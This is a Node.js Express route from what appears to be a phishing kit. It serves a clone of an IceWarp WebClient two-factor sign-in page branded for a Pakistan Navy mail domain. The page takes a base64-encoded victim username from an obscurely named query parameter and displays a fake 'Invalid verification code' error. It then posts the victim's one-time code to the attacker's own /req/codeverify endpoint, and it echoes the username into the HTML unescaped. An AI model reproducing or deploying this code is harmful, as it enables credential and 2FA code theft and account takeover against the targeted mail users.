
const express = require ('express');
const router = express.Router();


router.use(express.static('public'));



//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data3 = req.query.fgjhfjhgjftrurtfgncvbdssg;
    const username = Buffer.from(data3, 'base64').toString('utf-8');
    const firstLetter = username.charAt(0);

	if (data3 == null) {
        res.render('error');
        
      }else{
    const htmlContent = `
        <!DOCTYPE html>
            <html>
            <head>
                <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
                <title>IceWarp WebClient</title>
                <base href=".">
                <link rel="icon" href="/files/favicon-32.png" sizes="32x32">
                <meta id="theme-colors">
                <meta http-equiv="X-UA-Compatible" content="IE=edge">
                <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0">
                <meta name="google" value="notranslate">
                <meta http-equiv="cleartype" content="on">
                <meta name="version" content="25020709">
                <meta name="stylesheet" content="css/style.css" variables="true">
                <link type="text/css" href="/files/api.css" rel="stylesheet">
                <link type="text/css" href="/files/pikaday.css" rel="stylesheet">
                <link type="text/css" href="/files/style.css" rel="stylesheet">
                <!-- <link type="text/css" href="/files/custom.css" rel="stylesheet"> -->
                <link type="text/css" rel="stylesheet" href="/files/style.css">
                <style>
                :root {
                    --theme-color: hsl(266.45161290322585, 89.42307692307695%, 45%);
                    --default-color: hsl(266.45161290322585, 89.42307692307695%, 45%);
                    --deep-purple-color: hsl(266.45161290322585, 89.42307692307695%, 45%);
                    --default-grey-color: hsl(266.45161290322585, 6%, 69%);
                    --default-light-grey-color: hsl(266.45161290322585, 11%, 82%);
                }
                </style>
            </head>
            <body dir="ltr">
                <div class="o-external t-default cover sites-login site" style="background-color: rgb(103, 12, 217); background-image: url(&quot;https://mail.paknavy.gov.pk/webmail/./server/download.php?class=background&amp;fullpath=mail.paknavy.gov.pk&amp;uid=&amp;resize=1&amp;width=1920&amp;height=1080&quot;);" data-component="sites-login-1" id="content">
                <main class="o-external__main">
                    <form class="o-card c-card templates-card" data-hook="form" action="/req/codeverify" accept-charset="UTF-8"  method="POST" data-component="templates-card-2">
                    <div class="o-card__main">
                        <div data-component="atoms-dropdown-3" class="o-dropdown o-card__lang " data-hook="language">
                        <label class="o-dropdown__text">en</label>
                        </div>
                        <div class="o-card__content" data-hook="content">
                        <section data-component="organisms-card-section-11" class=" o-card__section   ">
                            <div data-component="organisms-card-header-3" class=" o-header  ">
                            <main class="o-header__main">
                                <div class="o-header__content">
                                <div data-component="atoms-avatar-2" class=" o-avatar   o-avatar--letter  o-header__avatar  " data-color="">${firstLetter}</div>
                                <h2 class=" o-header__title o-heading o-heading--beta  ">Sign in to WebClient</h2>
                                <p data-component="atoms-info-4" class=" o-info  o-info--normal   o-header__subsubtitle  ">${username} </p>
                                </div>
                                        <div style="margin-top:0.6rem;" data-hook="well" class="o-well o-well--error o-header__well is-visible atoms-well" data-component="atoms-well-2">
                                        <svg data-component="atoms-icons-9" class=" o-icon  o-well__icon  " viewBox="0 0 31 28">
                                            <path d="M15.5 9C14.9 9 14.5 9.4 14.5 10L14.5 17C14.5 17.6 14.9 18 15.5 18 16.2 18 16.6 17.6 16.6 17L16.6 10C16.6 9.4 16.2 9 15.5 9L15.5 9 15.5 9Z"/>
                                            <ellipse cx="15.6" cy="20.4" rx="1.2" ry="1.2"/>
                                            <path d="M30.3 20.9L19.6 2.4C18.8 1 17.2 0.1 15.5 0.1 13.9 0.1 12.5 1 11.5 2.4L0.8 20.9C-0.1 22.4-0.1 24.2 0.8 25.6 1.5 27 3.2 27.9 4.8 27.9L26.3 27.9C28.1 27.9 29.6 27 30.3 25.6 31.2 24.2 31.2 22.4 30.3 20.9L30.3 20.9 30.3 20.9ZM28.2 24.4C27.9 25.2 27 25.7 26 25.7L5.3 25.7C4.4 25.7 3.6 25.2 3.1 24.4 2.5 23.5 2.5 22.5 3.1 21.6L13.3 4C13.6 3.1 14.5 2.6 15.6 2.6 16.6 2.6 17.5 3.1 18 4L28.2 21.6C28.7 22.5 28.7 23.5 28.2 24.4L28.2 24.4 28.2 24.4Z"/>
                                        </svg>

                                    <div class="o-well__content">
                                        <p class="o-well__text u-bold">Something went wrong</p>
                                        <p class="o-well__text">Invalid verification code</p>
                                    </div>
                                    </div>
                            </main>
                            </div>
                        </section>
                        <section data-component="organisms-card-section-12" class=" o-card__section   u-hide  ">
                            <label data-component="molecules-input-4" class="o-input o-form__object molecules-input">
                            <input data-component="atoms-element-input-6" class=" o-form__element" type="text" name="username" value="${username}" data-hook="username">
                            </label>
                        </section>
                        <section data-component="organisms-card-section-13" class=" o-card__section  o-card__section--form   ">
                            <label data-component="molecules-input~validatable-5" class="o-input o-form__object molecules-input is-empty">
                            <input data-component="atoms-element-input-7" class=" o-form__element" required="" type="number" name="totpcode" autocomplete="off" maxlength="6" data-hook="totpcode">
                            <span data-component="atoms-label-3" class=" o-label  o-form__label  o-form__label--main  o-form__label--floating  ">Verification code</span>
                            </label>
                        </section>
                        <section data-component="organisms-card-section-14" class=" o-card__section  o-card__section--form   ">
                            <div data-component="molecules-checkbox-2" class=" o-checkbox o-checkbox--default   ">
                            <input data-component="atoms-element-input-5" class=" o-checkbox__element" type="checkbox" name="remember-me" data-hook="persistentlogin">
                            <i class="o-checkbox__icon"></i>
                            <label class="o-checkbox__label">Keep me signed in</label>
                            </div>
                        </section>
                        <section data-component="organisms-card-section-15" class=" o-card__section  o-card__section--default  o-card__section--space-top   ">
                            <div data-component="molecules-button-3" class=" o-button o-form__object  o-button--block  o-button--primary   ">
                            <button data-component="atoms-element-button-3" data-hook="validate-totp" name="next" type="submit">
                                <span>Sign in</span>
                            </button>
                            </div>
                        </section>
                        <section data-component="organisms-card-section-16" class=" o-card__section  o-card__section--footer   ">
                            <p data-component="atoms-info~not-you-3" class=" o-info   u-align-center  ">Not you? <a data-component="atoms-link~check-account-3" class=" o-link  o-link--switch   " data-hook="back-to-email">Check your account again</a>
                            </p>
                        </section>
                        </div>
                    </div>
                    </form>
                </main>
                <div data-component="organisms-bar~footer-1" class=" o-bar  o-external__footer  ">
                        <section class=" o-bar__section  o-bar__section--start  ">
                    <p class="o-external__copy o-info">Powered by IceWarp ©&nbsp; <time datetime="2025">2025</time>
                    </p>
                    </section>
                    <section class=" o-bar__section  o-bar__section--center  ">
                    <a class="o-external__social" title="https://www.facebook.com/IceWarpInc" href="https://www.facebook.com/IceWarpInc" rel="noopener" target="_blank">
                        <svg data-component="atoms-icons-3" class="o-icon o-external__icon" viewBox="0 0 330 330">
                        <path d="M165 0c-91.080 0-165 73.92-165 165s73.92 165 165 165c91.080 0 165-73.92 165-165s-73.92-165-165-165zM203.94 138.6l-1.98 19.8h-30.36v92.4h-33v-92.4h-19.8v-19.8h19.8v-21.12c0-7.92 1.32-19.8 6.6-27.060 5.94-7.92 14.52-13.2 29.040-13.2 23.1 0 33 3.3 33 3.3l-4.62 27.060c0 0-9.24-1.98-16.5-1.98s-15.18 2.64-15.18 9.9v23.76h33z"/>
                        </svg>
                    </a>

                    <a class="o-external__social" title="https://twitter.com/icewarp" href="https://twitter.com/icewarp" rel="noopener" target="_blank">
                        <svg data-component="atoms-icons-4" class=" o-icon  o-external__icon  " viewBox="0 0 330 330">
                        <path d="M165 0c-91.080 0-165 73.92-165 165s73.92 165 165 165c91.080 0 165-73.92 165-165s-73.92-165-165-165zM249.48 132c0 1.98 0 3.3 0 5.28 0 54.12-40.92 116.16-116.16 116.16-23.1 0-44.22-6.6-62.7-18.48 3.3 0.66 6.6 0.66 9.9 0.66 19.14 0 36.96-6.6 50.82-17.16-17.82-0.66-33-11.88-38.28-28.38 2.64 0.66 5.28 0.66 7.92 0.66 3.96 0 7.26-0.66 10.56-1.32-18.48-3.96-32.34-20.46-32.34-40.26 0 0 0-0.66 0-0.66 6.6 3.3 11.88 4.62 18.48 5.28-11.22-7.26-18.48-19.8-18.48-33.66 0-7.26 1.98-14.52 5.28-20.46 19.8 24.42 50.16 40.92 83.82 42.24-0.66-3.3-1.32-5.94-1.32-9.24 0-22.44 18.48-40.92 40.92-40.92 11.88 0 22.44 4.62 29.7 12.54 9.24-1.98 17.82-5.28 25.74-9.9-3.3 9.24-9.24 17.82-17.82 22.44 7.92-0.66 15.84-3.3 23.1-6.6-4.62 9.24-11.22 16.5-19.14 21.78z"/>
                        </svg>
                    </a>
                    <a class="o-external__social" title="https://www.linkedin.com/company/IceWarp" href="https://www.linkedin.com/company/IceWarp" rel="noopener" target="_blank">
                        <svg data-component="atoms-icons-5" class=" o-icon  o-external__icon  " viewBox="0 0 330 330">
                        <path d="M165 0c-91.080 0-165 73.92-165 165s73.92 165 165 165 165-73.92 165-165c0-91.080-73.92-165-165-165zM118.8 250.8h-39.6v-118.8h39.6v118.8zM99 125.4v0c-12.54 0-21.12-10.56-21.12-21.78s8.58-20.46 21.12-20.46c12.54 0 20.46 9.9 21.12 21.12 0 10.56-7.92 21.12-21.12 21.12zM250.8 250.8h-39.6v-62.7c0-15.18-3.96-25.080-17.16-25.080-10.56 0-13.86 6.6-17.16 13.2-1.32 2.64 1.32 5.94 1.32 9.24v65.34h-40.26c0 0 0.66-105.6 0-118.8h40.26v19.8c0-7.92 11.88-18.48 31.68-18.48 24.42 0 40.92 15.84 40.92 50.16v67.32z"/>
                        </svg>
                    </a>

                    </section>
                    <section class=" o-bar__section  o-bar__section--end  ">
                    <p class="o-info" title="Epos Update 1 build 17">
                        <a href="https://www.icewarp.com/" target="_blank" rel="noopener noreferrer">www.icewarp.com</a>
                    </p>
                    </section>
                </div>
                </div>

                <script>
                const totpInput = document.querySelector('input[name="totpcode"]');
                const formObject = totpInput.closest('.o-form__object');
                const labelSpan = formObject.querySelector('.o-form__label--floating');
                const originalText = 'Verification code';
                const errorText = 'Verification code - Length must be 6 characters';

                function updateLabelState() {
                    const value = totpInput.value.trim();
                    if (value !== '') {
                    formObject.classList.remove('is-empty');
                    } else {
                    formObject.classList.add('is-empty');
                    }
                }

                function validateOnBlur() {
                    const value = totpInput.value.trim();
                    if (value !== '' && value.length !== 6) {
                    labelSpan.textContent = errorText;
                    labelSpan.style.color = '#ec3e53';
                    labelSpan.style.fontWeight = 'bold';
                    } else {
                    labelSpan.textContent = originalText;
                    labelSpan.style.color = '';
                    labelSpan.style.fontWeight = '';
                    }
                }

                function resetOnFocus() {
                    labelSpan.textContent = originalText;
                    labelSpan.style.color = '';
                    labelSpan.style.fontWeight = '';
                }

                totpInput.addEventListener('input', updateLabelState);
                totpInput.addEventListener('blur', validateOnBlur);
                totpInput.addEventListener('focus', resetOnFocus);

                updateLabelState();
                </script>

            </body>
            </html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);
      }
});




module.exports =router